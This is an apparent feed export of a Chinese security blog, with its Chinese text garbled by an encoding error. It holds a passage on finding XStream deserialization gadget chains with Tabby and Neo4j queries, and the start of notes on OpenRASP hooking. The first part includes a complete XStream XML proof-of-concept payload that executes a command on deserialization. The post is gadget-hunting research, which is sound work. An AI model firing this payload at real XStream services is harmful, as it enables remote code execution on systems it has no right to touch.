apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,13) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ— æœï¼Œæ— æ³•ç›´æ¥ä¸²è”</p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2</h4><p>æœ‰ä¸€ç§æ ¸å¿ƒä¸­é—´é“¾ï¼Œproxyç±»ï¼Œå­˜åœ¨invokeï¼Œä¸”methodã€objå¯æ§çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; invoke</span><br><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p>éƒ½è¿‡ä¸€éï¼Œå¯ä»¥å¾—å‡ºç±»ä¼¼ä»¥ä¸‹å¯æ§çš„ç±»</p><p><img src="/images/pasted-163.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;get&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,16) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-166.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;marshal&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-167.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4-1"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4-1" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-168.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;get&quot;] </span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,5) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-169.png" alt="upload successful"></p><h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><p>åŸç†åŠåˆ†æå¯ä»¥çœ‹ä¸Šä¸€ç¯‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä»GadgetæŒ–æ˜è§’åº¦ï¼Œä½¿ç”¨tabbyå¤ç°äº†å‡ ä¸ªGadgetçš„æŒ–æ˜è¿‡ç¨‹ï¼Œssrfçš„2ä¸ªé“¾å¾ˆç®€å•ï¼Œrceæœ‰äº›ä¸ªæ¯”è¾ƒå¤æ‚ï¼Œæœ€çŸ­è·¯å¾„ç®—æ³•ä¸èƒ½ç›´æ¥ä¸²èµ·ã€‚è¿™äº›ä¸ªé“¾çš„é‡ç‚¹åœ¨äºä¸­é—´æ ¸å¿ƒé“¾è·¯çš„ç»„è£…ï¼Œæœ¬èœğŸ”ä¹Ÿåªèƒ½å€’æ¨å‡ºéƒ¨åˆ†èŠ‚ç‚¹ï¼Œè¿˜æœ‰ä¸€äº›å…³é”®è½¬æŠ˜ç‚¹å¦‚æœåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è‡ªå·±æ¥ï¼Œå¤§æ¦‚ç‡æ˜¯å‘ç°ä¸äº†çš„ã€‚</p><p>å…¶ä»–æ€è€ƒ&amp;æ€»ç»“</p><ol><li>apoc.algo.allSimplePaths æ˜¯æœ€çŸ­è·¯å¾„ï¼Œæœ‰æœ€çŸ­å°±ä¸ä¼šåˆ—å‡ºå…¶ä»–çš„ï¼Œè€Œæœ€çŸ­çš„ä¸ä¸€å®šæ˜¯æœ‰æ•ˆçš„ï¼Œå¯¼è‡´å¯èƒ½ä¼šæ¼ï¼ˆä¹Ÿå¯ä»¥æ­é…[r:CALL|ALIAS*5..8]ä½¿ç”¨ï¼‰ã€‚</li><li>ä¸­é—´æ ¸å¿ƒé“¾è·¯çš„ç»„è£…ï¼Œå› ä¸ºinvokeç­‰ä¸èƒ½è‡ªåŠ¨ä¸²èµ·ï¼Œéœ€è¦ç§¯ç´¯ã€‚</li><li>21342ã€21345 å¯ä»¥çœ‹å‡ºè¿˜æœ‰å…¶ä»–çš„è·¯å¾„ï¼Œæ˜¯å¦ä¹Ÿå¯è¡Œï¼Ÿï¼ˆç­‰æœ‰ç²¾åŠ›å†éªŒè¯ä¸‹å§ğŸ˜“ï¼‰</li></ol><p>æœ€åå†æ¬¡æ„Ÿè°¢wh1t3p1gå¸ˆå‚…ï¼Œç”¨tabbyæ··äº†ä¸ªcveï¼Œä¹Ÿé€†å‘å¤ç°äº†è¿™äº›Gadgetsçš„æŒ–æ˜æ€è·¯ã€‚</p><p>1.4.17æ–°å‡ºé‚£äº›å…¶ä»–çš„Gadgetsï¼Œè¿˜æ²¡ç©ºåˆ†æå¦‚ä½•æ‰¾åˆ°é“¾çš„ï¼Œç­‰æœ‰ç²¾åŠ›å†æ°´ä¸€èŠ‚å§ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96">tabby-ç°æœ‰åˆ©ç”¨é“¾è¦†ç›–</a></li><li>[2] <a href="https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/">å¦‚ä½•é«˜æ•ˆçš„æŒ–æ˜Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Ÿ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœˆåº•åœ¨å³ï¼Œå†ä¸å†™ç‚¹ä¸œè¥¿ï¼Œæ¯æœˆä¸€ç¯‡éƒ½è¦é£Ÿè¨€äº†ã€‚ä¸Šä¸ªæœˆåˆšæŒ–çš„OpenRASPçš„å‘ï¼Œæœ¬æ‰“ç®—å†ç ”ç©¶ç ”ç©¶ç»•è¿‡å§¿åŠ¿ï¼ŒéªŒè¯ä¸‹çŒœæƒ³ï¼Œä¹Ÿæ²¡ä¸‹æ–‡ã€‚æ­£å¥½6æœˆä»½äº¤çš„XStream SSRF Gadget CVEä¸‹æ¥ï¼Œä¹‹å‰XStreamç³»åˆ—è‰ç¨¿ç®±é‡Œä¹Ÿå¾…ç€ä¹‹å‰é€†å‘åˆ†æå¸ˆå‚…ä»¬æŒ–æ˜çš„æ€è·¯&amp;amp;æ‰‹æ³•ï¼Œæ­£å¥½ç¼–è¾‘ç¼–è¾‘ï¼Œæ°´ä¸€ç¯‡â€å¦‚ä½•æŒ–æ˜XStream Gadgetsâ€ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ„Ÿè°¢Wh1t3p1gå¸ˆå‚…çš„Tabbyï¼Œç”¨èµ·æ¥æ¯”gadgetinspectoræ›´é¡ºæ‰‹ï¼Œæ‰¾é“¾ç¥å™¨ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Tabby&quot;&gt;&lt;a href=&quot;#Tabby&quot; class=&quot;headerlink&quot; title=&quot;Tabby&quot;&gt;&lt;/a&gt;Tabby&lt;/h2&gt;&lt;p&gt;æœ‰å…³Tabbyçš„ä»‹ç»ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒã€1ã€‘ä¸­Wh1t3p1gå¸ˆå‚…çš„å‡ ä¸ªwikiï¼Œå†™çš„å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šå•°å—¦ã€‚ï¼ˆè¿™é‡Œè†œä¸€ä¸‹Wh1t3p1gå¸ˆå‚…ï¼‰&lt;/p&gt;
&lt;p&gt;Neo4j æŸ¥è¯¢æ¯”è¾ƒåƒcpuï¼Œå°æœ¬æœ¬åŠ ä¸ŠideaåŒæ—¶è·‘åƒåŠ›ï¼Œæå°vpsè·‘æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯tabbyæ˜¯é€šè¿‡apoc.load.csv fileå†™Neo4jæ•°æ®çš„ï¼Œç›¸å½“äºé™åˆ¶äº†æœ¬æœºï¼Œå› æ­¤ç»™ä¸‹æ•´åº“çš„dumpå’Œloadï¼ˆå½“ç„¶ï¼Œç›´æ¥æ•´ä¸ªåœ¨vpsä¸Šæ“ä½œä¹Ÿæ˜¯okçš„ï¼‰ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# dump neo4j database&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;neo4j-admin dump --to /tmp/neo4j.dump --database neo4j&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# scp dump file to vps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# load neo4j dump file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j stop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
    <category term="Tabby" scheme="http://m0d9.me/tags/Tabby/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASPå­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</title>
    <link href="http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-07-13T10:23:00.000Z</published>
    <updated>2021-07-18T13:34:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>RASPï¼ˆRuntime Application self-protectionï¼‰æŠ€æœ¯è‡ªGartneråœ¨2014å¹´æå‡ºï¼Œå·²ç»æœ‰æŒºé•¿ä¸€æ®µæ—¶é—´äº†ã€‚å¤§å‚ä»¬ç°åœ¨åŸºæœ¬ä¹Ÿéƒ½æœ‰è‡ªç ”çš„RASPã€IASTäº§å“ã€‚åœ¨å¼€æºRASPä¸­ï¼Œåº”ä»¥OpenRASPèµ·æ­¥æœ€æ—©ï¼Œåº”ç”¨ä¹Ÿæœ€å¹¿ã€‚ä¸è¿‡å› ä¸ºæ€§èƒ½åŸå› ï¼Œåœ¨å®é™…æ”»é˜²ä¸­è¦†ç›–é¢è¿˜æ˜¯æœ‰é™ã€‚</p><p>RASPç®—æ˜¯Javaå®‰å…¨ç»•ä¸å¼€çš„ä¸€ä¸ªæŠ€æœ¯ç‚¹ï¼Œæœ‰å…´è¶£å¯¹æ­¤å­¦ä¹ ç ”ç©¶ä¸€ç•ªã€‚å‚è€ƒæ–‡ç« ä¸­threedr3amã€tr1pleã€c0d3p1ut0så‡ ä¸ªå¸ˆå‚…ä»¬å¯¹äºOpenRASPçš„åŸç†ã€æŠ€æœ¯ç‚¹éƒ½æœ‰è·Ÿè¸ªå’Œè§£é‡Šï¼Œå› æ­¤æœ¬æ–‡ä¸å†å¤šåšç±»ä¼¼çš„é˜é‡Šï¼Œä¸»è¦é’ˆå¯¹è‡ªå·±çš„ä¸€äº›çŸ¥è¯†ç›²ç‚¹ã€å…´è¶£ç‚¹ï¼Œåšåšç ”ç©¶ä¸ç¬”è®°ã€‚</p><h2 id="OpenRASPçš„Hook"><a href="#OpenRASPçš„Hook" class="headerlink" title="OpenRASPçš„Hook"></a>OpenRASPçš„Hook</h2><p>å…³æ³¨ä¸¤ç‚¹ï¼š</p><ol><li>å¦‚ä½•Hookçš„</li><li>Hookäº†å“ªäº›ç±»çš„å“ªäº›æ–¹æ³•</li></ol><h3 id="å¦‚ä½•Hook"><a href="#å¦‚ä½•Hook" class="headerlink" title="å¦‚ä½•Hook"></a>å¦‚ä½•Hook</h3><a id="more"></a><p>å®˜æ–¹æ–‡æ¡£å·²ç»æè¿°çš„å¾ˆè¯¦ç»†äº†<br><img src="/images/pasted-147.png" alt="upload successful"></p><p>æ³¨æ„æ­¥éª¤2 Retransfromï¼Œç¬¬ä¸€æ¬¡é‡åˆ°</p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Java Instrumentation APiæ”¯æŒå¯åŠ¨æ—¶/è¿è¡Œæ—¶Attach Agentï¼Œå…·ä½“çœ‹ä¸ªç®€å•ä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public static void agentmain(String agentArgs, Instrumentation instrumentation) &#123;</span></span><br><span class="line"><span class="comment">//        instrumentation.addTransformer(new DefineTransformer(), true);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;org/m0d9/sec/JavassistDemo/Target&quot;</span>.equals(className)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br></pre></td></tr></table></figure><p>ï¼ˆè¿™ä¸ªæ˜¯beyondå¤§ä½¬ä»¥å‰MemShellçš„ä»£ç ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯premainä»¥åŠtransformå®ç°æ¥å£ï¼Œå¤§åŒå°å¼‚ï¼ŒOpenRASPçš„è¿™ä¸ªé€»è¾‘æ˜¯åœ¨EngineBoot#startå¼€å§‹çš„ï¼Œå…·ä½“çš„ä»£ç å°±ä¸è´´äº†ï¼Œæµç¨‹è·Ÿè¸ªå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">EngineBoot#initTransformer</span><br><span class="line">CustomClassTransformer#</span><br><span class="line">CustomClassTransformer#addAnnotationHook</span><br><span class="line">CustomClassTransformer#retransform</span><br><span class="line">CustomClassTransformer#transform</span><br><span class="line">AbstractClassHook#transformClass</span><br></pre></td></tr></table></figure><p>OpenRASPå…·ä½“çš„transformé€»è¾‘åœ¨AbstractClassHookçš„å„ç§å­ç±»ä¸­å®ç°</p><h4 id="Javassists"><a href="#Javassists" class="headerlink" title="Javassists"></a>Javassists</h4><p>transformå†…æ˜¯é€šè¿‡Javassistså­—èŠ‚ç 